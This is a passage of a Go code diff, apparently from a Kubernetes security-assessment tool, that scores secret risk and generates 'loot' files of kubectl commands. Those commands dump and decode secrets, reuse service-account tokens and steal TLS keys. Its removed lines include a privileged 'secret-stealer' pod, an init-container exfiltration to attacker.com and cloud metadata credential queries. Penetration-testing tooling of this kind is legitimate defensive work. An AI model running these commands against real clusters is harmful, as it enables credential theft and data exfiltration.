+		issues = append(issues, "NOT_IMMUTABLE")
+	}
+	if finding.SAHasAdminAccess {
+		issues = append(issues, "SA_ADMIN_ACCESS")
+	}
+
+	return issues
+}
+
+// calculateSecretRiskScore calculates comprehensive risk score
+func calculateSecretRiskScore(finding *SecretFinding) (string, int) {
+	score := 0
+
+	// Cloud credentials = CRITICAL
+	if finding.CloudCredentials {
+		score += 90
+	}
+
+	// Private keys = HIGH
+	if finding.PrivateKeys {
+		score += 70
+	}
+
+	// Active pod exposure
+	score += len(finding.MountedInPods) * 5
+
+	// RBAC exposure (blast radius)
+	if finding.RBACAccessCount > 50 {
+		score += 50
+	} else if finding.RBACAccessCount > 20 {
+		score += 30
+	} else if finding.RBACAccessCount > 10 {
+		score += 20
+	} else {
+		score += finding.RBACAccessCount * 2
+	}
+
+	// Public accessibility = CRITICAL
+	if finding.PubliclyAccessible {
+		score += 80
+	}
+
+	// Over-privileged access
+	if finding.OverPrivilegedAccess {
+		score += 25
+	}
+
+	// Age-based scoring
+	if finding.AgeDays > 365 {
+		score += 30
+	} else if finding.AgeDays > 180 {
+		score += 20
+	} else if finding.AgeDays > 90 {
+		score += 10
+	}
+
+	// Certificate expiration
+	if finding.CertExpired {
+		score += 90
+	} else if finding.CertExpiringSoon {
+		score += 40
+	}
+
+	// Unused but accessible = security risk
+	if finding.IsUnused && finding.RBACAccessCount > 0 {
+		score += 25
+	}
+
+	// Large secret = potential credential dump
+	if finding.DataSize > 1048576 {
+		score += 15
+	}
+
+	// Not immutable sensitive data
+	if !finding.IsImmutable && finding.HasSensitivePattern {
+		score += 10
+	}
+
+	// SA with admin access
+	if finding.SAHasAdminAccess {
+		score += 60
+	}
+
+	// Namespace-based scoring
+	if finding.Namespace == "kube-system" || finding.Namespace == "kube-public" {
+		score += 15
+	}
+
+	// Determine risk level
+	if score >= 85 {
+		return "CRITICAL", score
+	} else if score >= 60 {
+		return "HIGH", score
+	} else if score >= 30 {
+		return "MEDIUM", score
+	}
+	return "LOW", score
+}
+
+func stringListOrNoneSecret(list []string) string {
+	if len(list) == 0 {
+		return "<NONE>"
+	}
+	return strings.Join(list, ", ")
+}
+
+func generateSecretLootContent(finding *SecretFinding, secret *v1.Secret, dataKeys []string,
+	namespaceLootEnum *map[string][]string,
+	lootDecode, lootPatterns, lootCloudCreds, lootActiveExposure,
+	lootRBACAccess, lootSATokens, lootUnused, lootCertExpiry, lootOldStale, lootRemediation *[]string) {
+
+	secretID := fmt.Sprintf("%s/%s", finding.Namespace, finding.Name)
+
+	// Enumeration
+	(*namespaceLootEnum)[finding.Namespace] = append((*namespaceLootEnum)[finding.Namespace],
+		fmt.Sprintf("# [%s] %s (Type: %s)", finding.RiskLevel, secretID, finding.Type),
+		fmt.Sprintf("kubectl get secret %s -n %s -o yaml", finding.Name, finding.Namespace),
+		fmt.Sprintf(`kubectl get secret %s -n %s -o json | jq -r '.data | to_entries[] | "\(.key)=\(.value | @base64d)"'`, finding.Name, finding.Namespace),
+		"",
+	)
+
+	// Decode commands
+	*lootDecode = append(*lootDecode, fmt.Sprintf("\n# [%s] Secret: %s (Type: %s)", finding.RiskLevel, secretID, finding.Type))
+	if len(finding.SensitivePatterns) > 0 {
+		*lootDecode = append(*lootDecode, fmt.Sprintf("# Patterns: %s", strings.Join(finding.SensitivePatterns, ", ")))
+	}
+	for _, key := range dataKeys {
+		*lootDecode = append(*lootDecode, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.%s}' | base64 -d", finding.Name, finding.Namespace, key))
+	}
+	*lootDecode = append(*lootDecode, "")
+
+	// Active exposure analysis
+	if len(finding.MountedInPods) > 0 {
+		*lootActiveExposure = append(*lootActiveExposure, fmt.Sprintf("\n# [%s] %s -> %d pods (%s mount)", finding.RiskLevel, secretID, len(finding.MountedInPods), finding.MountType))
+		if len(finding.SensitivePatterns) > 0 {
+			*lootActiveExposure = append(*lootActiveExposure, fmt.Sprintf("# Contains: %s", strings.Join(finding.SensitivePatterns, ", ")))
+		}
+		for _, pod := range finding.MountedInPods {
+			parts := strings.Split(pod, "/")
+			if len(parts) == 2 {
+				*lootActiveExposure = append(*lootActiveExposure, fmt.Sprintf("kubectl exec -n %s %s -- sh -c 'ls -la /var/run/secrets/ || env | grep -i secret || env'", parts[0], parts[1]))
+			}
+		}
+		*lootActiveExposure = append(*lootActiveExposure, "")
+	}
+
+	// RBAC access analysis
+	if finding.RBACAccessCount > 0 {
+		*lootRBACAccess = append(*lootRBACAccess, fmt.Sprintf("\n### %s - Accessible by %d ServiceAccounts", secretID, finding.RBACAccessCount))
+		if finding.PubliclyAccessible {
+			*lootRBACAccess = append(*lootRBACAccess, "  - PUBLICLY ACCESSIBLE (system:authenticated)")
+		}
+		if finding.OverPrivilegedAccess {
+			*lootRBACAccess = append(*lootRBACAccess, "  - Over-privileged access (admin/edit roles)")
+		}
+		for i, sa := range finding.AccessibleBySAs {
+			if i < 10 {
+				*lootRBACAccess = append(*lootRBACAccess, fmt.Sprintf("  - %s", sa))
+			}
+		}
+		if len(finding.AccessibleBySAs) > 10 {
+			*lootRBACAccess = append(*lootRBACAccess, fmt.Sprintf("  - ... and %d more", len(finding.AccessibleBySAs)-10))
+		}
+		*lootRBACAccess = append(*lootRBACAccess, "")
+	}
+
+	// ServiceAccount token analysis
+	if finding.IsSAToken {
+		*lootSATokens = append(*lootSATokens, fmt.Sprintf("\n### %s - ServiceAccount: %s/%s", secretID, finding.SANamespace, finding.SAName))
+		*lootSATokens = append(*lootSATokens, fmt.Sprintf("TOKEN=$(kubectl get secret %s -n %s -o jsonpath='{.data.token}' | base64 -d)", finding.Name, finding.Namespace))
+		*lootSATokens = append(*lootSATokens, "kubectl auth can-i --list --token=$TOKEN")
+		*lootSATokens = append(*lootSATokens, "")
+	}
+
+	// Unused secrets
+	if finding.IsUnused {
+		*lootUnused = append(*lootUnused, fmt.Sprintf("\n### %s - Age: %d days", secretID, finding.AgeDays))
+		*lootUnused = append(*lootUnused, fmt.Sprintf("  - Not mounted in any pod"))
+		*lootUnused = append(*lootUnused, fmt.Sprintf("  - Accessible by %d ServiceAccounts", finding.RBACAccessCount))
+		if finding.AgeDays > 180 {
+			*lootUnused = append(*lootUnused, fmt.Sprintf("  - OLD: Created %d days ago", finding.AgeDays))
+		}
+		*lootUnused = append(*lootUnused, "  - Consider deletion if truly unused")
+		*lootUnused = append(*lootUnused, fmt.Sprintf("  # kubectl delete secret %s -n %s", finding.Name, finding.Namespace))
+		*lootUnused = append(*lootUnused, "")
+	}
+
+	// Certificate expiration
+	if finding.IsTLS {
+		*lootCertExpiry = append(*lootCertExpiry, fmt.Sprintf("\n### %s", secretID))
+		*lootCertExpiry = append(*lootCertExpiry, fmt.Sprintf("  Subject: %s", finding.CertSubject))
+		*lootCertExpiry = append(*lootCertExpiry, fmt.Sprintf("  Issuer: %s", finding.CertIssuer))
+		if finding.CertExpired {
+			*lootCertExpiry = append(*lootCertExpiry, "  Status: EXPIRED")
+		} else if finding.CertExpiringSoon {
+			*lootCertExpiry = append(*lootCertExpiry, fmt.Sprintf("  Status: Expiring in %d days (URGENT)", finding.CertExpiryDays))
+		} else {
+			*lootCertExpiry = append(*lootCertExpiry, fmt.Sprintf("  Expires in: %d days", finding.CertExpiryDays))
+		}
+		if finding.CertSelfSigned {
+			*lootCertExpiry = append(*lootCertExpiry, "  Type: Self-signed")
+		}
+		*lootCertExpiry = append(*lootCertExpiry, "")
+	}
+
+	// Old/stale secrets
+	if finding.AgeDays > 180 {
+		*lootOldStale = append(*lootOldStale, fmt.Sprintf("\n### %s - %d days old", secretID, finding.AgeDays))
+		*lootOldStale = append(*lootOldStale, fmt.Sprintf("  - Created: %s", finding.CreatedAt.Format("2006-01-02")))
+		if finding.CloudCredentials {
+			*lootOldStale = append(*lootOldStale, "  - Contains cloud credentials (ROTATION RECOMMENDED)")
+		}
+		if len(finding.MountedInPods) == 0 {
+			*lootOldStale = append(*lootOldStale, "  - Not currently in use (consider deletion)")
+		}
+		*lootOldStale = append(*lootOldStale, "")
+	}
+
+	// Cloud credential patterns
+	if finding.Type == v1.SecretTypeDockerConfigJson {
+		*lootPatterns = append(*lootPatterns, fmt.Sprintf("\n# [%s] DOCKER REGISTRY CREDENTIALS: %s", finding.RiskLevel, secretID))
+		*lootPatterns = append(*lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq .", finding.Name, finding.Namespace))
+		*lootPatterns = append(*lootPatterns, "")
+
+		*lootCloudCreds = append(*lootCloudCreds, fmt.Sprintf("\n# [%s] Docker Registry: %s", finding.RiskLevel, secretID))
+		*lootCloudCreds = append(*lootCloudCreds, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d > docker-config.json", finding.Name, finding.Namespace))
+		*lootCloudCreds = append(*lootCloudCreds, "# docker login -u <username> -p <password> <registry>")
+		*lootCloudCreds = append(*lootCloudCreds, "")
+	}
+
+	// Remediation
+	if len(finding.SecurityIssues) > 0 {
+		*lootRemediation = append(*lootRemediation, fmt.Sprintf("\n### %s (%d issues)", secretID, len(finding.SecurityIssues)))
+		for _, issue := range finding.SecurityIssues {
+			*lootRemediation = append(*lootRemediation, fmt.Sprintf("## Issue: %s", issue))
+			switch {
+			case strings.Contains(issue, "PUBLICLY_ACCESSIBLE"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Remove RBAC bindings granting public access")
+			case strings.Contains(issue, "RBAC_OVERLY_ACCESSIBLE"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Reduce RBAC permissions, use namespace-scoped Roles")
+			case strings.Contains(issue, "OLD_SECRET"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Rotate secret credentials")
+			case strings.Contains(issue, "CERT_EXPIRED"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Renew certificate immediately")
+			case strings.Contains(issue, "CERT_EXPIRING_SOON"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Renew certificate before expiration")
+			case strings.Contains(issue, "NOT_IMMUTABLE"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Set immutable: true for security and performance")
+			case strings.Contains(issue, "UNUSED_BUT_ACCESSIBLE"):
+				*lootRemediation = append(*lootRemediation, "Remediation: Delete if truly unused, or remove RBAC access")
+			}
+		}
+		*lootRemediation = append(*lootRemediation, "")
+	}
+}
+
+func generateExploitationTechniques() []string {
+	return []string{`
 ##############################################
 ## 1. Extract Secrets from Running Pods
 ##############################################
@@ -407,39 +1142,7 @@ curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
 kubectl auth can-i --list --token=$TOKEN
 
 ##############################################
-## 3. Create Privileged Pod to Access Secrets
-##############################################
-# If you can create pods, deploy privileged pod to access all secrets:
-
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secret-stealer
-  namespace: default
-spec:
-  serviceAccountName: default
-  containers:
-  - name: stealer
-    image: alpine:latest
-    command: ["/bin/sh"]
-    args: ["-c", "apk add --no-cache curl jq && sleep 3600"]
-    volumeMounts:
-    - name: secrets
-      mountPath: /secrets
-      readOnly: true
-  volumes:
-  - name: secrets
-    projected:
-      sources:
-      - secret:
-          name: <secret-name>
-EOF
-
-kubectl exec secret-stealer -- sh -c 'cat /secrets/*'
-
-##############################################
-## 4. RBAC Enumeration for Secret Access
+## 3. RBAC Enumeration for Secret Access
 ##############################################
 # Find who can read secrets:
 kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | jq -r '.items[] | select(.roleRef.name | test(".*secret.*|.*admin.*|.*edit.*")) | "\(.metadata.namespace)//\(.metadata.name) -> \(.roleRef.name)"'
@@ -448,142 +1151,22 @@ kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | jq -r '.
 kubectl auth can-i get secrets --all-namespaces
 
 ##############################################
-## 5. Secret Exfiltration via Init Container
+## 4. Extract Secrets via RBAC
 ##############################################
-# If you can modify deployments, add init container to exfiltrate secrets:
-
-kubectl patch deployment <deployment> -n <namespace> --type json -p='[
-  {
-    "op": "add",
-    "path": "/spec/template/spec/initContainers/-",
-    "value": {
-      "name": "exfiltrate",
-      "image": "curlimages/curl:latest",
-      "command": ["sh", "-c"],
-      "args": ["curl -X POST -d @/secrets/data https://attacker.com/exfil || true"],
-      "volumeMounts": [{
-        "name": "secret-volume",
-        "mountPath": "/secrets"
-      }]
-    }
-  }
-]'
+# If you have a ServiceAccount with secret read permissions:
+SA_TOKEN=$(kubectl get secret <sa-secret> -n <namespace> -o jsonpath='{.data.token}' | base64 -d)
+kubectl --token=$SA_TOKEN get secrets --all-namespaces
 
 ##############################################
-## 6. Cloud Provider Metadata Service Access
+## 5. Certificate Theft
 ##############################################
-# From pod with secret access, query metadata service:
+# Extract TLS private keys:
+kubectl get secret <tls-secret> -n <namespace> -o jsonpath='{.data.tls\.key}' | base64 -d > private.key
+kubectl get secret <tls-secret> -n <namespace> -o jsonpath='{.data.tls\.crt}' | base64 -d > cert.crt
 
-# AWS:
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
-
-# GCP:
-curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-
-# Azure:
-curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-`)
-
-	// Build loot enum with namespace headers
-	var lootEnum []string
-	lootEnum = append(lootEnum, `#####################################
-##### Enumerate Secrets
-#####################################
-
-`)
-	if globals.KubeContext != "" {
-		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
-	}
-
-	nsListEnum := make([]string, 0, len(namespaceLootEnum))
-	for ns := range namespaceLootEnum {
-		nsListEnum = append(nsListEnum, ns)
-	}
-	sort.Strings(nsListEnum)
-	for _, ns := range nsListEnum {
-		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
-		lootEnum = append(lootEnum, namespaceLootEnum[ns]...)
-	}
-
-	// Add risk summary to active exposure loot
-	criticalCount := 0
-	highCount := 0
-	for _, f := range findings {
-		if f.RiskLevel == "CRITICAL" {
-			criticalCount++
-		} else if f.RiskLevel == "HIGH" {
-			highCount++
-		}
-	}
-
-	if criticalCount > 0 || highCount > 0 {
-		summary := fmt.Sprintf("# SUMMARY: %d CRITICAL, %d HIGH risk secrets found\n\n", criticalCount, highCount)
-		lootActiveExposure = append([]string{summary}, lootActiveExposure...)
-	}
-
-	table := internal.TableFile{
-		Name:   "Secrets",
-		Header: headers,
-		Body:   outputRows,
-	}
-
-	lootFiles := []internal.LootFile{
-		{
-			Name:     "Secrets-Enum",
-			Contents: strings.Join(k8sinternal.Unique(lootEnum), "\n"),
-		},
-		{
-			Name:     "Secrets-Decode",
-			Contents: strings.Join(lootDecode, "\n"),
-		},
-		{
-			Name:     "Secrets-Pattern-Analysis",
-			Contents: strings.Join(lootPatterns, "\n"),
-		},
-		{
-			Name:     "Secrets-Cloud-Credentials",
-			Contents: strings.Join(lootCloudCreds, "\n"),
-		},
-		{
-			Name:     "Secrets-Active-Exposure",
-			Contents: strings.Join(lootActiveExposure, "\n"),
-		},
-		{
-			Name:     "Secrets-Exploitation",
-			Contents: strings.Join(lootExploitation, "\n"),
-		},
-	}
-
-	if err := internal.HandleOutput(
-		"Kubernetes",
-		format,
-		outputDirectory,
-		verbosity,
-		wrap,
-		"Secrets",
-		globals.ClusterName,
-		"results",
-		SecretsOutput{
-			Table: []internal.TableFile{table},
-			Loot:  lootFiles,
-		},
-	); err != nil {
-		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_SECRETS_MODULE_NAME)
-		return
-	}
-
-	if len(outputRows) > 0 {
-		if criticalCount > 0 || highCount > 0 {
-			logger.InfoM(fmt.Sprintf("%d secrets found (%d CRITICAL, %d HIGH risk)", len(outputRows), criticalCount, highCount), globals.K8S_SECRETS_MODULE_NAME)
-		} else {
-			logger.InfoM(fmt.Sprintf("%d secrets found across %d namespaces", len(outputRows), len(namespaces.Items)), globals.K8S_SECRETS_MODULE_NAME)
-		}
-	} else {
-		logger.InfoM("No secrets found, skipping output file creation", globals.K8S_SECRETS_MODULE_NAME)
-	}
-
-	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_SECRETS_MODULE_NAME), globals.K8S_SECRETS_MODULE_NAME)
+# Use stolen certificate:
+curl --key private.key --cert cert.crt https://secure-service.example.com
+`}
 }
 
 // Helper functions
